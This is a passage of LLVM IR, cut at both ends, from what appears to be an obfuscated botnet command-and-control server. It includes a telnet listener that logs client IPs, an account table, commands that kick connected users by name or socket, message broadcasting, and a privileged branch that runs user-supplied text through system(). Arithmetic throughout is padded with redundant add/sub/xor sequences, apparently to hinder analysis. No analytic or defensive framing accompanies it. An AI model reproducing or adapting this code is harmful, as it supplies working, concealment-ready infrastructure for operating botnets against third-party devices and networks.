  %677 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %678 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %679 = call i64 @strlen(i8* %678) #8
  %680 = call i64 @send(i32 %676, i8* %677, i64 %679, i32 16384)
  %681 = icmp eq i64 %680, -1
  br i1 %681, label %682, label %683

; <label>:682:                                    ; preds = %667
  store i8* null, i8** %2, align 8
  br label %998

; <label>:683:                                    ; preds = %667
  br label %684

; <label>:684:                                    ; preds = %683, %660, %652
  br label %685

; <label>:685:                                    ; preds = %684
  %686 = load i32, i32* %34, align 4
  %687 = add i32 %686, -1937598242
  %688 = add i32 %687, 1
  %689 = sub i32 %688, -1937598242
  %690 = add nsw i32 %686, 1
  store i32 %689, i32* %34, align 4
  br label %649

; <label>:691:                                    ; preds = %649
  br label %703

; <label>:692:                                    ; preds = %629
  %693 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %694 = call i32 (i8*, i8*, ...) @sprintf(i8* %693, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.62, i32 0, i32 0)) #7
  %695 = load i32, i32* %4, align 4
  %696 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %697 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %698 = call i64 @strlen(i8* %697) #8
  %699 = call i64 @send(i32 %695, i8* %696, i64 %698, i32 16384)
  %700 = icmp eq i64 %699, -1
  br i1 %700, label %701, label %702

; <label>:701:                                    ; preds = %692
  br label %702

; <label>:702:                                    ; preds = %701, %692
  br label %703

; <label>:703:                                    ; preds = %702, %691
  br label %704

; <label>:704:                                    ; preds = %703, %616
  %705 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %706 = call i8* @strstr(i8* %705, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i32 0, i32 0)) #8
  %707 = icmp ne i8* %706, null
  br i1 %707, label %708, label %862

; <label>:708:                                    ; preds = %704
  %709 = load i8*, i8** %13, align 8
  %710 = load i32, i32* %5, align 4
  %711 = sext i32 %710 to i64
  %712 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %711
  %713 = getelementptr inbounds %struct.account, %struct.account* %712, i32 0, i32 2
  %714 = getelementptr inbounds [200 x i8], [200 x i8]* %713, i32 0, i32 0
  %715 = call i32 @strcmp(i8* %709, i8* %714) #8
  %716 = icmp eq i32 %715, 0
  br i1 %716, label %726, label %717

; <label>:717:                                    ; preds = %708
  %718 = load i8*, i8** %13, align 8
  %719 = load i32, i32* %5, align 4
  %720 = sext i32 %719 to i64
  %721 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %720
  %722 = getelementptr inbounds %struct.account, %struct.account* %721, i32 0, i32 2
  %723 = getelementptr inbounds [200 x i8], [200 x i8]* %722, i32 0, i32 0
  %724 = call i32 @strcmp(i8* %718, i8* %723) #8
  %725 = icmp eq i32 %724, 0
  br i1 %725, label %726, label %850

; <label>:726:                                    ; preds = %717, %708
  %727 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %728 = call i8* @strstr(i8* %727, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.79, i32 0, i32 0)) #8
  %729 = icmp ne i8* %728, null
  br i1 %729, label %734, label %730

; <label>:730:                                    ; preds = %726
  %731 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %732 = call i8* @strstr(i8* %731, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i32 0, i32 0)) #8
  %733 = icmp ne i8* %732, null
  br i1 %733, label %734, label %799

; <label>:734:                                    ; preds = %730, %726
  %735 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %736 = call i8* @strtok(i8* %735, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i32 0, i32 0)) #7
  store i8* %736, i8** %37, align 8
  %737 = getelementptr inbounds [20 x i8], [20 x i8]* %36, i32 0, i32 0
  %738 = load i8*, i8** %37, align 8
  %739 = load i8*, i8** %37, align 8
  %740 = call i64 @strlen(i8* %739) #8
  %741 = getelementptr inbounds i8, i8* %738, i64 %740
  %742 = getelementptr inbounds i8, i8* %741, i64 1
  %743 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %737, i64 20, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.29, i32 0, i32 0), i8* %742) #7
  %744 = getelementptr inbounds [20 x i8], [20 x i8]* %36, i32 0, i32 0
  call void @trim(i8* %744)
  store i32 0, i32* %35, align 4
  br label %745

; <label>:745:                                    ; preds = %791, %734
  %746 = load i32, i32* %35, align 4
  %747 = icmp slt i32 %746, 1000000
  br i1 %747, label %748, label %798

; <label>:748:                                    ; preds = %745
  %749 = load i32, i32* %35, align 4
  %750 = sext i32 %749 to i64
  %751 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %750
  %752 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %751, i32 0, i32 2
  %753 = getelementptr inbounds [20 x i8], [20 x i8]* %752, i32 0, i32 0
  %754 = getelementptr inbounds [20 x i8], [20 x i8]* %36, i32 0, i32 0
  %755 = call i8* @strstr(i8* %753, i8* %754) #8
  %756 = icmp ne i8* %755, null
  br i1 %756, label %757, label %790

; <label>:757:                                    ; preds = %748
  %758 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %759 = load i32, i32* %4, align 4
  %760 = sext i32 %759 to i64
  %761 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %760
  %762 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %761, i32 0, i32 2
  %763 = getelementptr inbounds [20 x i8], [20 x i8]* %762, i32 0, i32 0
  %764 = call i32 (i8*, i8*, ...) @sprintf(i8* %758, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.82, i32 0, i32 0), i8* %763) #7
  %765 = load i32, i32* %35, align 4
  %766 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %767 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %768 = call i64 @strlen(i8* %767) #8
  %769 = call i64 @send(i32 %765, i8* %766, i64 %768, i32 16384)
  %770 = icmp eq i64 %769, -1
  br i1 %770, label %771, label %772

; <label>:771:                                    ; preds = %757
  store i8* null, i8** %2, align 8
  br label %998

; <label>:772:                                    ; preds = %757
  %773 = load i32, i32* %35, align 4
  %774 = sext i32 %773 to i64
  %775 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %774
  %776 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %775, i32 0, i32 1
  store i32 0, i32* %776, align 4
  %777 = load i32, i32* %35, align 4
  %778 = call i32 @close(i32 %777)
  %779 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %780 = getelementptr inbounds [20 x i8], [20 x i8]* %36, i32 0, i32 0
  %781 = call i32 (i8*, i8*, ...) @sprintf(i8* %779, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.83, i32 0, i32 0), i8* %780) #7
  %782 = load i32, i32* %4, align 4
  %783 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %784 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %785 = call i64 @strlen(i8* %784) #8
  %786 = call i64 @send(i32 %782, i8* %783, i64 %785, i32 16384)
  %787 = icmp eq i64 %786, -1
  br i1 %787, label %788, label %789

; <label>:788:                                    ; preds = %772
  store i8* null, i8** %2, align 8
  br label %998

; <label>:789:                                    ; preds = %772
  br label %790

; <label>:790:                                    ; preds = %789, %748
  br label %791

; <label>:791:                                    ; preds = %790
  %792 = load i32, i32* %35, align 4
  %793 = sub i32 0, %792
  %794 = sub i32 0, 1
  %795 = add i32 %793, %794
  %796 = sub i32 0, %795
  %797 = add nsw i32 %792, 1
  store i32 %796, i32* %35, align 4
  br label %745

; <label>:798:                                    ; preds = %745
  br label %849

; <label>:799:                                    ; preds = %730
  %800 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %801 = call i8* @strstr(i8* %800, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.84, i32 0, i32 0)) #8
  %802 = icmp ne i8* %801, null
  br i1 %802, label %807, label %803

; <label>:803:                                    ; preds = %799
  %804 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %805 = call i8* @strstr(i8* %804, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.85, i32 0, i32 0)) #8
  %806 = icmp ne i8* %805, null
  br i1 %806, label %807, label %848

; <label>:807:                                    ; preds = %803, %799
  %808 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %809 = call i8* @strtok(i8* %808, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i32 0, i32 0)) #7
  store i8* %809, i8** %38, align 8
  %810 = load i8*, i8** %38, align 8
  %811 = load i8*, i8** %38, align 8
  %812 = call i64 @strlen(i8* %811) #8
  %813 = getelementptr inbounds i8, i8* %810, i64 %812
  %814 = getelementptr inbounds i8, i8* %813, i64 1
  %815 = call i32 @atoi(i8* %814) #8
  store i32 %815, i32* %39, align 4
  %816 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %817 = load i32, i32* %4, align 4
  %818 = sext i32 %817 to i64
  %819 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %818
  %820 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %819, i32 0, i32 2
  %821 = getelementptr inbounds [20 x i8], [20 x i8]* %820, i32 0, i32 0
  %822 = call i32 (i8*, i8*, ...) @sprintf(i8* %816, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.82, i32 0, i32 0), i8* %821) #7
  %823 = load i32, i32* %39, align 4
  %824 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %825 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %826 = call i64 @strlen(i8* %825) #8
  %827 = call i64 @send(i32 %823, i8* %824, i64 %826, i32 16384)
  %828 = icmp eq i64 %827, -1
  br i1 %828, label %829, label %830

; <label>:829:                                    ; preds = %807
  store i8* null, i8** %2, align 8
  br label %998

; <label>:830:                                    ; preds = %807
  %831 = load i32, i32* %39, align 4
  %832 = sext i32 %831 to i64
  %833 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %832
  %834 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %833, i32 0, i32 1
  store i32 0, i32* %834, align 4
  %835 = load i32, i32* %39, align 4
  %836 = call i32 @close(i32 %835)
  %837 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %838 = load i32, i32* %39, align 4
  %839 = call i32 (i8*, i8*, ...) @sprintf(i8* %837, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.86, i32 0, i32 0), i32 %838) #7
  %840 = load i32, i32* %4, align 4
  %841 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %842 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %843 = call i64 @strlen(i8* %842) #8
  %844 = call i64 @send(i32 %840, i8* %841, i64 %843, i32 16384)
  %845 = icmp eq i64 %844, -1
  br i1 %845, label %846, label %847

; <label>:846:                                    ; preds = %830
  store i8* null, i8** %2, align 8
  br label %998

; <label>:847:                                    ; preds = %830
  br label %848

; <label>:848:                                    ; preds = %847, %803
  br label %849

; <label>:849:                                    ; preds = %848, %798
  br label %861

; <label>:850:                                    ; preds = %717
  %851 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %852 = call i32 (i8*, i8*, ...) @sprintf(i8* %851, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.87, i32 0, i32 0)) #7
  %853 = load i32, i32* %4, align 4
  %854 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %855 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %856 = call i64 @strlen(i8* %855) #8
  %857 = call i64 @send(i32 %853, i8* %854, i64 %856, i32 16384)
  %858 = icmp eq i64 %857, -1
  br i1 %858, label %859, label %860

; <label>:859:                                    ; preds = %850
  br label %860

; <label>:860:                                    ; preds = %859, %850
  br label %861

; <label>:861:                                    ; preds = %860, %849
  br label %862

; <label>:862:                                    ; preds = %861, %704
  %863 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %864 = call i8* @strstr(i8* %863, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.88, i32 0, i32 0)) #8
  %865 = icmp ne i8* %864, null
  br i1 %865, label %866, label %935

; <label>:866:                                    ; preds = %862
  %867 = load i8*, i8** %12, align 8
  %868 = load i32, i32* %5, align 4
  %869 = sext i32 %868 to i64
  %870 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %869
  %871 = getelementptr inbounds %struct.account, %struct.account* %870, i32 0, i32 2
  %872 = getelementptr inbounds [200 x i8], [200 x i8]* %871, i32 0, i32 0
  %873 = call i32 @strcmp(i8* %867, i8* %872) #8
  %874 = icmp eq i32 %873, 0
  br i1 %874, label %884, label %875

; <label>:875:                                    ; preds = %866
  %876 = load i8*, i8** %13, align 8
  %877 = load i32, i32* %5, align 4
  %878 = sext i32 %877 to i64
  %879 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %878
  %880 = getelementptr inbounds %struct.account, %struct.account* %879, i32 0, i32 2
  %881 = getelementptr inbounds [200 x i8], [200 x i8]* %880, i32 0, i32 0
  %882 = call i32 @strcmp(i8* %876, i8* %881) #8
  %883 = icmp eq i32 %882, 0
  br i1 %883, label %884, label %923

; <label>:884:                                    ; preds = %875, %866
  %885 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %886 = call i8* @strtok(i8* %885, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i32 0, i32 0)) #7
  store i8* %886, i8** %40, align 8
  %887 = load i8*, i8** %40, align 8
  %888 = getelementptr inbounds i8, i8* %887, i64 8
  store i8* %888, i8** %41, align 8
  %889 = load i8*, i8** %41, align 8
  call void @trim(i8* %889)
  %890 = getelementptr inbounds [50 x i8*], [50 x i8*]* %42, i32 0, i32 0
  %891 = bitcast i8** %890 to i8*
  %892 = load i8*, i8** %41, align 8
  %893 = call i32 (i8*, i8*, ...) @sprintf(i8* %891, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.89, i32 0, i32 0), i8* %892) #7
  %894 = getelementptr inbounds [50 x i8*], [50 x i8*]* %42, i32 0, i32 0
  %895 = bitcast i8** %894 to i8*
  %896 = call i32 @system(i8* %895)
  %897 = load i32, i32* %5, align 4
  %898 = sext i32 %897 to i64
  %899 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %898
  %900 = getelementptr inbounds %struct.account, %struct.account* %899, i32 0, i32 0
  %901 = getelementptr inbounds [200 x i8], [200 x i8]* %900, i32 0, i32 0
  %902 = load i8*, i8** %41, align 8
  %903 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.90, i32 0, i32 0), i8* %901, i8* %902)
  %904 = load i32, i32* %4, align 4
  %905 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %906 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %907 = call i64 @strlen(i8* %906) #8
  %908 = call i64 @send(i32 %904, i8* %905, i64 %907, i32 16384)
  %909 = icmp eq i64 %908, -1
  br i1 %909, label %910, label %911

; <label>:910:                                    ; preds = %884
  store i8* null, i8** %2, align 8
  br label %998

; <label>:911:                                    ; preds = %884
  %912 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %912, %struct._IO_FILE** %43, align 8
  %913 = load %struct._IO_FILE*, %struct._IO_FILE** %43, align 8
  %914 = load i32, i32* %5, align 4
  %915 = sext i32 %914 to i64
  %916 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %915
  %917 = getelementptr inbounds %struct.account, %struct.account* %916, i32 0, i32 0
  %918 = getelementptr inbounds [200 x i8], [200 x i8]* %917, i32 0, i32 0
  %919 = load i8*, i8** %41, align 8
  %920 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %913, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.90, i32 0, i32 0), i8* %918, i8* %919)
  %921 = load %struct._IO_FILE*, %struct._IO_FILE** %43, align 8
  %922 = call i32 @fclose(%struct._IO_FILE* %921)
  br label %934

; <label>:923:                                    ; preds = %875
  %924 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %925 = call i32 (i8*, i8*, ...) @sprintf(i8* %924, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.62, i32 0, i32 0)) #7
  %926 = load i32, i32* %4, align 4
  %927 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %928 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %929 = call i64 @strlen(i8* %928) #8
  %930 = call i64 @send(i32 %926, i8* %927, i64 %929, i32 16384)
  %931 = icmp eq i64 %930, -1
  br i1 %931, label %932, label %933

; <label>:932:                                    ; preds = %923
  br label %933

; <label>:933:                                    ; preds = %932, %923
  br label %934

; <label>:934:                                    ; preds = %933, %911
  br label %935

; <label>:935:                                    ; preds = %934, %862
  %936 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %937 = call i8* @strstr(i8* %936, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.91, i32 0, i32 0)) #8
  %938 = icmp ne i8* %937, null
  br i1 %938, label %939, label %940

; <label>:939:                                    ; preds = %935
  br label %985

; <label>:940:                                    ; preds = %935
  %941 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @trim(i8* %941)
  %942 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %943 = load i32, i32* %5, align 4
  %944 = sext i32 %943 to i64
  %945 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %944
  %946 = getelementptr inbounds %struct.account, %struct.account* %945, i32 0, i32 0
  %947 = getelementptr inbounds [200 x i8], [200 x i8]* %946, i32 0, i32 0
  %948 = call i32 (i8*, i8*, ...) @sprintf(i8* %942, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.37, i32 0, i32 0), i8* %947) #7
  %949 = load i32, i32* %4, align 4
  %950 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %951 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %952 = call i64 @strlen(i8* %951) #8
  %953 = call i64 @send(i32 %949, i8* %950, i64 %952, i32 16384)
  %954 = icmp eq i64 %953, -1
  br i1 %954, label %955, label %956

; <label>:955:                                    ; preds = %940
  br label %985

; <label>:956:                                    ; preds = %940
  %957 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %958 = call i64 @strlen(i8* %957) #8
  %959 = icmp eq i64 %958, 0
  br i1 %959, label %960, label %961

; <label>:960:                                    ; preds = %956
  br label %239

; <label>:961:                                    ; preds = %956
  %962 = load i32, i32* %5, align 4
  %963 = sext i32 %962 to i64
  %964 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %963
  %965 = getelementptr inbounds %struct.account, %struct.account* %964, i32 0, i32 0
  %966 = getelementptr inbounds [200 x i8], [200 x i8]* %965, i32 0, i32 0
  %967 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %968 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.92, i32 0, i32 0), i8* %966, i8* %967)
  %969 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %969, %struct._IO_FILE** %44, align 8
  %970 = load %struct._IO_FILE*, %struct._IO_FILE** %44, align 8
  %971 = load i32, i32* %5, align 4
  %972 = sext i32 %971 to i64
  %973 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %972
  %974 = getelementptr inbounds %struct.account, %struct.account* %973, i32 0, i32 0
  %975 = getelementptr inbounds [200 x i8], [200 x i8]* %974, i32 0, i32 0
  %976 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %977 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %970, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.92, i32 0, i32 0), i8* %975, i8* %976)
  %978 = load %struct._IO_FILE*, %struct._IO_FILE** %44, align 8
  %979 = call i32 @fclose(%struct._IO_FILE* %978)
  %980 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %981 = load i32, i32* %4, align 4
  %982 = getelementptr inbounds [80 x i8], [80 x i8]* %10, i32 0, i32 0
  call void @broadcast(i8* %980, i32 %981, i8* %982)
  %983 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %983, i8 0, i64 2048, i32 16, i1 false)
  br label %239

; <label>:984:                                    ; preds = %239
  br label %985

; <label>:985:                                    ; preds = %984, %955, %939, %614, %567, %321, %301, %220, %205, %194, %193, %174, %168, %134, %128, %118, %111
  %986 = load i32, i32* %4, align 4
  %987 = sext i32 %986 to i64
  %988 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %987
  %989 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %988, i32 0, i32 1
  store i32 0, i32* %989, align 4
  %990 = load i32, i32* %4, align 4
  %991 = call i32 @close(i32 %990)
  %992 = load volatile i32, i32* @managesConnected, align 4
  %993 = sub i32 0, %992
  %994 = sub i32 0, -1
  %995 = add i32 %993, %994
  %996 = sub i32 0, %995
  %997 = add nsw i32 %992, -1
  store volatile i32 %996, i32* @managesConnected, align 4
  br label %998

; <label>:998:                                    ; preds = %985, %910, %846, %829, %788, %771, %682, %647
  %999 = load i8*, i8** %2, align 8
  ret i8* %999
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #4

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: nounwind
declare i32 @snprintf(i8*, i64, i8*, ...) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #2

declare i32 @system(i8*) #1

; Function Attrs: noinline nounwind uwtable
define i8* @telnetListener(i32) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct._IO_FILE*, align 8
  %10 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  %11 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %11, i32* %4, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %12, 0
  br i1 %13, label %14, label %15

; <label>:14:                                     ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.94, i32 0, i32 0))
  br label %15

; <label>:15:                                     ; preds = %14, %1
  %16 = bitcast %struct.sockaddr_in* %7 to i8*
  call void @llvm.memset.p0i8.i64(i8* %16, i8 0, i64 16, i32 4, i1 false)
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %19 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %18, i32 0, i32 0
  store i32 0, i32* %19, align 4
  %20 = load i32, i32* %3, align 4
  %21 = trunc i32 %20 to i16
  %22 = call zeroext i16 @htons(i16 zeroext %21) #9
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %4, align 4
  %25 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %26 = call i32 @bind(i32 %24, %struct.sockaddr* %25, i32 16) #7
  %27 = icmp slt i32 %26, 0
  br i1 %27, label %28, label %29

; <label>:28:                                     ; preds = %15
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.95, i32 0, i32 0))
  br label %29

; <label>:29:                                     ; preds = %28, %15
  %30 = load i32, i32* %4, align 4
  %31 = call i32 @listen(i32 %30, i32 5) #7
  store i32 16, i32* %6, align 4
  br label %32

; <label>:32:                                     ; preds = %93, %29
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.96, i32 0, i32 0))
  %34 = bitcast %struct.sockaddr_in* %8 to { i64, i64 }*
  %35 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %34, i32 0, i32 0
  %36 = load i64, i64* %35, align 4
  %37 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %34, i32 0, i32 1
  %38 = load i64, i64* %37, align 4
  call void @client_addr(i64 %36, i64 %38)
  %39 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %39, %struct._IO_FILE** %9, align 8
  %40 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %42 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %41, i32 0, i32 0
  %43 = load i32, i32* %42, align 4
  %44 = xor i32 %43, -1
  %45 = xor i32 255, -1
  %46 = xor i32 1992568638, -1
  %47 = or i32 %44, %45
  %48 = or i32 1992568638, %46
  %49 = xor i32 %47, -1
  %50 = and i32 %49, %48
  %51 = and i32 %43, 255
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %53 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %52, i32 0, i32 0
  %54 = load i32, i32* %53, align 4
  %55 = xor i32 %54, -1
  %56 = xor i32 65280, -1
  %57 = xor i32 -1063883814, -1
  %58 = or i32 %55, %56
  %59 = or i32 -1063883814, %57
  %60 = xor i32 %58, -1
  %61 = and i32 %60, %59
  %62 = and i32 %54, 65280
  %63 = lshr i32 %61, 8
  %64 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %65 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %64, i32 0, i32 0
  %66 = load i32, i32* %65, align 4
  %67 = xor i32 %66, -1
  %68 = xor i32 16711680, -1
  %69 = xor i32 374674730, -1
  %70 = or i32 %67, %68
  %71 = or i32 374674730, %69
  %72 = xor i32 %70, -1
  %73 = and i32 %72, %71
  %74 = and i32 %66, 16711680
  %75 = lshr i32 %73, 16
  %76 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %77 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %76, i32 0, i32 0
  %78 = load i32, i32* %77, align 4
  %79 = xor i32 -16777216, -1
  %80 = xor i32 %78, %79
  %81 = and i32 %80, %78
  %82 = and i32 %78, -16777216
  %83 = lshr i32 %81, 24
  %84 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %40, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.97, i32 0, i32 0), i32 %50, i32 %63, i32 %75, i32 %83)
  %85 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %86 = call i32 @fclose(%struct._IO_FILE* %85)
  %87 = load i32, i32* %4, align 4
  %88 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %89 = call i32 @accept(i32 %87, %struct.sockaddr* %88, i32* %6)
  store i32 %89, i32* %5, align 4
  %90 = load i32, i32* %5, align 4
  %91 = icmp slt i32 %90, 0
  br i1 %91, label %92, label %93

; <label>:92:                                     ; preds = %32
